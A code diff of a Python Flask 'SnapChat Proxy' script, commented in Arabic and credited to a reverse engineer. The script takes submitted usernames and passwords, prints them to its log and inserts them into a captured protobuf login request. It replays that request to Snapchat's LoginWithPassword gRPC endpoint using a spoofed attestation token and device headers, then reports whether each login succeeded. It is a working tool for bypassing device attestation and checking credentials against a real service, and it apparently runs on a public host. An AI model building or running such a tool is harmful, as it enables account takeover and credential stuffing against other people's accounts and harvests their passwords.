@@ -1,21 +1,29 @@
 #!/usr/bin/env python3
-from flask import Flask, request, Response
-import requests
-import json
 import base64
 import struct
-from google.protobuf import descriptor_pool
+import requests
+import json
+from flask import Flask, request, Response
+from google.protobuf import descriptor_pool, descriptor_pb2
 import blackboxprotobuf
+
+# ============================================================
+#   Reverse Engineered by  0xfff0800 = FaLaH
+#   Modified for Proxy Server
+# ============================================================
 
 app = Flask(__name__)
 
 # ============================================================
-# 1. كل التوكنات والهيدرات المستخرجة من جهازك النظيف
+# الـ Protobuf الخام المسجل من الجهاز النظيف
+# ============================================================
+raw_data = "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sW/DAdSzdVPuzwu3+L2TfHXHYp+h42sdg+7ranUUgVXpGdtUGZRK0QCxi/MPaj3nKEiZgwQ9G0++keSJoJL/v0IWcBT9gJ3/751XtvnJNsqpzSoDNZ1/IVl4aCmrYPxU3FBam/31gv3vF5j62nelNOvonoOL5++u0FY0gLJ+bseddpuzRxWi+ttES7VEmg4KOEU9khG8gTM7/yWedxzdn/jC43vpamKROOnpB4433T6F6CC5BaVzfOgD9kF+n6YL/6SLyhFqVzZkraGJRdET8r0NJC7izCMTc9T3UPUMa+wi9uMyNb9rpm28Y73S765izFduQEJ+N2366Kq70xkfhtUVg2LoF0FnQUFBTDhZaVJQK281VTUwcVdvNHYxdXozSUVVTmswK21lODl2TGZ2NVppbmdweU9Pa2dYWFh5alB6WVR6V21XU3UrQllxY0Q0N2J5aXJMWisrM2RKY2NwRjk5aFdwcFQ3RzV4QXVVK3k1NldwU1lzQVEwS1RvK2Y2ZzZ3cmhqTTgvOXRpQ09pdGVYMFdtODdocUNxNnd4L2tlUE5sNHRyTlpkTUdSOFlCQ0l2VjU1MmhiNWEvVldVb1hGYjN0Wm1uTjliWWh4VkFnQUFKMDUxNjEvdHBZV3RlcjVxeDJhU3lvVXFyMklnT3hnOEEzZzMyYVBKMGRwV3U0L1puZWVUQUEwWG9POWlzSVlFYkF3SEZSWUFvYjRPRVJ6N2tRTDNxNTMwWWplVkhFU1crS3V6S0p3blVXLyt6QWpuY056QndhZi9lMHpiRW1ONTd0MDRlbStESW4wSnlyKzdJVEZDcGovR2hWQmNnUmhhZnZ6ZGFCUGJVdUg5cHE5UjgrOGhBOUYrYmtDczh1T3V4Zkc4SzJsY3E2VXVHYTZFY3RHSmZpOG1FYVhHWnczbEtaQkFJV0dRdVBIU2VJbVBmeThZcDZtVUxJTEo2dXA3bGVjT2JsVlZPbi9CcHV4bTFtdEE1bVRuemtMTmJqc1lsYXhqSVZaQmxJN0xITGk4S1dYMEh4Z0JFbmJGMzV0TVRYYUNrNHhicUdYN3RJeWtIM2pKR3NycStibEhsTWFnWGhTTlppUTFYMTl5MU45Q0p2YktHNHhVYUp2ajZKM1ZHbjBZZGpvemRKNHI2dEtmSUpNVjZ0QmwzWnc2QVF3V3N2SGE5RWthYmM2S0RLRGU3UGlEQnhrYUhENFRtSGhQSkZUMkl5RGdwQkJHTlRSREtyWkROTUx6c2Ewa1pvK1lhZWd0YW1DcVQzSVVMYlRod25zRWxjV1JUOTl0djl0RGt0bUJZaS9hS3ZGTmJiVUdPSkRvVzc1S3RxdzQ4cXdubHg0cjlHZk05V1cxSDRmRkhvK2RibnlCMVhqTS8wbzlDeEtaYmlmaDRwYmRyUFZDYll6Nm1TczVrSXVuR2dXVksxYVlTSVA0bkFQek1mSkpQSTJxQmpseWprVm5kRG4yckhOa0poVkxHMmhFbHFHTlkyOW56RWlPZCtHV2k5R25FVDc1UUtLN1RKRTRndDVKVHJvWVJuWlpNbU1icnBicE9aN0dhY0lNVGhuOTV1Zmx1YTZORGJiZEJvby9ia1BUQmlrMDUrRDdNUzhFak0zR3hEQUFzYTdTVHlrQXZMZUMzdmUvMm5WYkJGNjZZYm5XcU5NM1QvV0xzQ2VVVStFZERlWmx3Z2pGaVRZcllsWTVadG93Tytyb3dvN0tnblQ1RXYvaWZra0p1SWpLV21OVXkrWVV0cVBTbXJYS2JwQlRkekNPYmVyWkJRblBMSXAzZnlOb3REZjBWNEkrTGFNKy9wVXg2NWdDL0R0N05lbWsveU9kNWdlTHhMZ2ZBL1ZldjJ0TURicmJPZytRZVdaTHg2ZllnVjY5Q0R2YVEyUTBsUXNVNkNYQ29FOExGZTRyQW1hcGQxeVVtczE1TGJsYThSTVlaVllGWUFDTFZERVkrNG5WWnlWYWZ4NkJNOE9aRWpQa3VuSkIvbVpxeStWa3EzZTRtMUJlM2hTL1l2azNoWFZQTldxUzRrcW9qUXV4S0o5YkJjYkRueFdOZ1ZxNkxwNWpUd1lDWGZRN2ZYTTlVbjFWaTJ4T0pZNEFVdkdJY2hKRGlpWjRCVkQ4RURSSXNhL1kzNkVFK0wxcnQ0aDN6bDh2WGxMTUV3Qk5FdDBVNW9zc2daOGkvWWpSa0VQdVhVcnFYVFdVVlRTNmtSWm1qeFBOOGR0akRJbzlPOTZYcmJ1WVBMaFkvRy93YjE5ZnQxSDl5dEt5NUtlcFVmcGF6b3U1bVh3dGFnTXNqTFFPRm5vTm1Va29VS3J1UFZwdkhLUTd4MGtiSHV2R1A4Mk5sUVpnWExmM2JNdU82cU51OXFsMGtsL3ZubDdOYXVqL1RNbDlvQ0kyWEMrVHlGVTg0S0ZsU0I0d1ZDQjJmdUNsNmFrYy9RSDZrZlBEb0c0UjZNZEtObm52SlJUdjZHQXgyaWxlZWFVR0ZnU2t1Ym9yUmJGK2NjWFRBQWlrWndNWUlxT0lWSFk3OUxsaVNOU3VsaGN1Uk4zZUFaWExzaWl0Q1FTQ0IxeUdxazQ5NXZ1MFRXUGFrelAxTVlKZk5uSWdVSUcwZFk1TEJQWmxub0NJa2Q0RVkwVStpdHlzYVZ0dTkyeU1DUEcrcEh3V1VMVDBHdTFoZFdsdnhQLytuTkpyNFB1L0FIUXB2WHBDRXJKVWZSVzJadkNScDIwUVBaZmNnd2FyQkV2bmt6bXBvbUpxOVlNc2xUeTk4T2VVdkczbElpMU9Cc04vUi9tRVNuTkFBV1RZemhnSlJzcVExOTFzS2pVS1FjcmFrTmErWWdSVHpqUno1RjkxZno4dnNvV2pMRHhFc0ZiemUrbVVIZlVueXQ5THFxZ0p2cVdEWll6TzRNRXp5RkF3RkdBcFBqTmprOStXZ1R1R0tpaEhWWjJQeEpZbjZSQW5za1N6Y290TnBtODVVTzc1U3RTNHNVUkFKbEdqVnVmcElreHMrRGdrd25nM29DYmpwWVNDb0VEK1RlOC9CV1lEUjFaVGhBN1o4MW91enBianppN3Faa3FKV2ZiZmsrbkljcXBZUUk0dytuZ2tyVU93YnpPM0JkSFBWMDZrVHlhRWxGRU5jOUNpTXlYWXB4WlE1dmtlZFF4SFVSNUJVRVZJSFA1djRRemdpVzhNUXQyQkdDVW5VbFZuYUdPYWFLYklpcDBpa3RlOVBvRWs4dm53YllNRHVmNUNiUnpPUDM5Tnh2dWR4a0tvdm9wR3BGSWJSWVZuaGxKTlA0ZUlUd29DVjR6MmlMbi8xaHlBeXVyQXRwR2F5WGVncURVM290VzFOenpzNUlKYTZRSHFKTllSUU5mMTBGTHROdDd0elJpRXR6d0RJckVkMFUzQXZYUHBxL1RueGhuT1V0VDRqSXVOclZ4dXRZS1NPSEdPK01DSURVR2l6NFdvS3hyVGR0TmtBQW4vZEFWNVk3UUl3L0ZJWm1yQXBWTUJXbXRZSzQ1VERKTXViclpWSlVKSlJ2eXJ1M3FtY2Y0ZXZGd2NMZEJSbjdJUTZIK2MvM0tDa0J0WXJSWnV0RVM0V3ZXLytBZ3RRem42ajRxMWVDUHhoVG8rOFV3cTR4RzZOT3M3WEtuakV0cW9TeHlEQ1F3OWJrSndBSVdMdXdmd05BZEUyVFZyZVdyQVA1ZVhiY2RoMGFKQ1hZcVlCV3JBRGxMUk96UGVXREIyTElrbm9GUndTQ1VSWWlBeGJNb2JDMnpjazJtdURlQVBiVkZlZGRmYUxpZlRRWFVSR3d0RjV1djUxNjJZclZRVHlhUTcrWEJhc1VNSHpYWmpQdDVIeDE3eFpKRGQyQVVBd3krRStKTmFHVm1KTjA0NDFLby9Eb01vZlduNGQ1REI1SGxIZmFuQ1h1Yzk0M0RGcXZBODI0M2JJdVdybUZiMWRZNHZqU3JEWVF5dFJyUUFVSUJZVW5uYVQydVJsd1V2eVU4V2w2V0F1aUNlclRqcmY2ZnpPcVJtcXRwcGxYbjNsQzIzZUVYeDZJek54RXZMa2VlYXJkV0pvdTBicEIvWmRYdFo3TTRJUnFVTHVaYnowa1BiMGkyaHZDTmowYUUzQVZGdjB4ZC82aHp6Z1NnbGxBRmtnN2tvNnFGZTlmdFhhVFBYY3Z1ZENOelBpcDZ5cVBNZTY3bnJYYnAzVG50WS9md1REZit6YlBvc1JoVkhweUwxeXJvclBtTnhXZjVMRjRFTkU1RzdIYzhxMnp6Sml1ZHRwMXR2TEQ2MkducnJGaS9YbEljZnhSNi9BWWc5cTJSb2ZtK2gzc3NJQUpUek9leStUWlZWRDRmdDNEdWozbDNOTUxOY1V0d0ZzdUZSMFhoZXJvL3BYUmdzU0ZYR0ZqOHBxSkt2Qjg3SGlHQQ=="
+
+# ============================================================
+# التوكنات والهيدرات من جهازك النظيف
 # ============================================================
 HEADERS = {
-    "User-Agent": "Snapchat/12.80.0.35 (iPhone15,2; iOS 17.4.1; gzip)",
-    "Accept-Language": "en-US,en;q=0.9",
-    "Accept-Encoding": "gzip, deflate, br",
+    "User-Agent": "Snapchat/13.20.0.36 (iPhone15,2; iOS 17.4.1; gzip)",
     "Content-Type": "application/grpc+proto",
     "te": "trailers",
     "X-Snapchat-UUID": "0196B3EE-508D-4FAC-9F7B-1B790E57DDBB",
@@ -24,25 +32,13 @@ HEADERS = {
     "x-snapchat-att-token": "Ci1iNFCsaIvuN4FmwoMSXqFN1o531mchZS20Zbt9Sv2TDy8ACaUEsYDd88NjSwoVAQAAAA==",
 }
 
-# عنوان API الخاص بتسجيل الدخول (gRPC endpoint)
 SNAPCHAT_API = "https://us-east1-aws.api.snapchat.com/snapchat.janus.api.LoginService/LoginWithPassword"
 
-# ============================================================
-# 2. الـ Protobuf الكامل (من جهازك النظيف)
-# ============================================================
-CAPTURED_PROTOBUF_B64 = "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"
-
-# ============================================================
-# الوظائف المساعدة
-# ============================================================
 def build_grpc_payload(proto_bytes):
     """بناء payload gRPC: 0x00 + length (4 bytes) + protobuf"""
     length_prefix = struct.pack('>I', len(proto_bytes))
     return b'\x00' + length_prefix + proto_bytes
 
-# ============================================================
-# نقطة الدخول الرئيسية (يستقبل طلبات التعديل)
-# ============================================================
 @app.route('/proxy_login', methods=['POST', 'GET'])
 def proxy_login():
     if request.method == 'GET':
@@ -56,24 +52,22 @@ def proxy_login():
     print(f"[+] Password: {password}")
     
     try:
-        # 1. فك الـ Protobuf المسجل من جهازك النظيف
-        proto_bytes = base64.b64decode(CAPTURED_PROTOBUF_B64)
-        
-        # 2. استخدام blackboxprotobuf لفك تشفيره وتعديل username و password
+        # 1. فك الـ Protobuf الخام
+        proto_bytes = base64.b64decode(raw_data)
         decoded, typedef = blackboxprotobuf.decode_message(proto_bytes)
         
-        # 3. تعديل الحقول 1 (username) و 4 (password)
+        # 2. تعديل username و password
         decoded['1'] = username.encode('utf-8')
         decoded['4'] = password.encode('utf-8')
         typedef['4']['type'] = 'bytes'
         
-        # 4. إعادة تشفير الـ Protobuf بعد التعديل
+        # 3. إعادة تشفير الـ Protobuf
         modified_proto_bytes = blackboxprotobuf.encode_message(decoded, typedef)
         
-        # 5. بناء payload gRPC
+        # 4. بناء gRPC payload
         grpc_body = build_grpc_payload(modified_proto_bytes)
         
-        # 6. إرسال الطلب إلى Snapchat الحقيقي مع الهيدرات والتوكنات
+        # 5. إرسال إلى Snapchat الحقيقي
         response = requests.post(
             SNAPCHAT_API,
             headers=HEADERS,
@@ -84,14 +78,14 @@ def proxy_login():
         print(f"[*] HTTP Status: {response.status_code}")
         print(f"[*] grpc-status: {response.headers.get('grpc-status', 'unknown')}")
         
-        # 7. تحليل الرد
+        # 6. تحليل الرد
         if response.status_code == 200:
             grpc_status = response.headers.get('grpc-status', '')
             if grpc_status == '0':
                 print(f"[✓] SUCCESS! Login successful for {username}")
                 return Response('{"status":"success", "message":"Login successful"}', status=200)
             else:
-                print(f"[!] Attestation token accepted, but password may be incorrect for {username}")
+                print(f"[!] Attestation accepted but password may be incorrect for {username}")
                 return Response('{"status":"attestation_accepted", "message":"Wrong password"}', status=200)
         else:
             print(f"[X] Failed with status: {response.status_code}")
@@ -108,14 +102,13 @@ def health():
 if __name__ == '__main__':
     print("""
     ╔══════════════════════════════════════════════════════════════╗
-    ║     SnapChat Proxy - FINAL VERSION                          ║
+    ║     SnapChat Proxy - Complete Version                       ║
     ║                                                              ║
-    ║  ✅ Headers and tokens loaded                               ║
-    ║  ✅ Captured protobuf loaded                                ║
-    ║  ✅ Using blackboxprotobuf to modify credentials            ║
+    ║  ✅ Full protobuf decode/encode with blackboxprotobuf      ║
+    ║  ✅ All tokens and headers from clean device                ║
+    ║  ✅ Sending to real SnapChat API                            ║
     ║                                                              ║
-    ║  Server running on http://0.0.0.0:10000                    ║
-    ║  Endpoint: /proxy_login (POST/GET)                         ║
+    ║  Server: https://makkahproxi.onrender.com/proxy_login       ║
     ╚══════════════════════════════════════════════════════════════╝
     """)
     app.run(host='0.0.0.0', port=10000, debug=False)
